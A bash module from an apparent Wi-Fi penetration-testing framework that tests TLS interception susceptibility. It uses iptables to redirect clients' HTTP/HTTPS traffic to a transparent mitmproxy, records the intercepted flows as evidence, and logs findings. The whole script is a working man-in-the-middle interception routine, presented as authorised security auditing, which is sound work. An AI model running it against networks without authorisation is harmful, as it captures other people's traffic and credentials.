#!/usr/bin/env bash
# MODULE_META
# NAME="SSL/TLS Interception"
# CATEGORY="G"
# DEPS="G1"
# CRITICAL="no"
# TOOLS="mitmproxy,iptables"
# DESC="Test for SSL/TLS interception susceptibility (HSTS, certificate pinning)"
# REQS="managed_iface"
# PCAP="no"
# TIMED="yes"
# DECODE="tls"

#===============================================================================
#  modules/g2_ssl_interception.sh
#  G2: SSL/TLS Interception (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Position the local system as a MITM (via G1).
#  2. Use iptables to redirect transit HTTP/HTTPS traffic to a local transparent
#     proxy (mitmproxy).
#  3. Attempt to decrypt TLS traffic using a spoofed CA certificate.
#  4. Monitor for clients that ignore certificate warnings or lack HSTS/Pinning.
#===============================================================================

set -euo pipefail



# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/g2"
SCAN_TIME="${SCAN_TIME:-60}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G2"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo "[*] Testing SSL/TLS interception susceptibility on ${INTERFACE}..."

MITM_LOG="${EVIDENCE_DIR}/${TC_ID}_mitmproxy.log"
FLOW_FILE="${EVIDENCE_PREFIX}_flows.mitm"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up SSL interception processes..."
    [[ -n "${MITM_PID:-}" ]] && kill "$MITM_PID" 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 2>/dev/null || true
}
trap cleanup EXIT

# 1. Start mitmproxy
if command -v mitmproxy &>/dev/null; then
    echo "[*] Starting mitmproxy transparent proxy..."
    
    # Setup iptables redirect
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 || true
        iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 || true
    else
        iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 >/dev/null 2>&1 || true
        iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 >/dev/null 2>&1 || true
    fi
    
    # 1. 🛰️ DYNAMIC TELEMETRY HEARTBEAT (Background)
    (
        ELAPSED=0
        while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
            PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
            [[ $PERCENT -gt 90 ]] && PERCENT=90
            STATUS="SSL Interception in progress... ($(( SCAN_TIME - ELAPSED ))s left)"
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
            sleep 2
            ((ELAPSED+=2))
        done
    ) &
    TEL_PID=$!

    # 2. RUN PRIMARY TOOL (Foreground in Window, Background with Wait otherwise)
    # In window mode: mitmproxy renders its interactive TUI (correct for user review).
    # In background mode: use mitmdump (non-interactive CLI equivalent) — mitmproxy
    # requires a TTY and will fail silently without one.
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        timeout --foreground "$SCAN_TIME" mitmproxy --mode transparent --save-stream "$FLOW_FILE" || true
    else
        timeout "$SCAN_TIME" mitmdump --mode transparent -w "$FLOW_FILE" > "$MITM_LOG" 2>&1 &
        TOOL_PID=$!
        wait "$TOOL_PID" || true
    fi

    kill "$TEL_PID" 2>/dev/null || true
    cleanup
    trap - EXIT
    
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 95 --status "Reviewing SSL flows..."

    # 2. Reporting
    if [[ -f "$FLOW_FILE" && -s "$FLOW_FILE" ]]; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "SSL Interception Vulnerability Confirmed" \
            --severity HIGH \
            --desc "Successfully intercepted and recorded TLS flows on $INTERFACE." \
            --target "Local Clients" \
            --evidence "$FLOW_FILE" \
            --rationale "Testing for SSL interception vulnerability identifies clients that are susceptible to credential theft via spoofed certificates. Successful flow capture indicates lack of HSTS enforcement or certificate pinning in target applications."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[G2] Audit Complete" \
            --severity INFO \
            --desc "Completed SSL/TLS interception test. No active traffic was intercepted by the transparent proxy." \
            --target "Local Clients" \
            --evidence "$MITM_LOG" \
            --rationale "While the proxy was active, no clients attempted connections that could be intercepted. This indicates either low client activity or effective mitigation on the client side."
    fi
else
    echo "[!] mitmproxy not found. Skipping SSL interception test."
    exit 1
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "SSL Interception test complete."

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
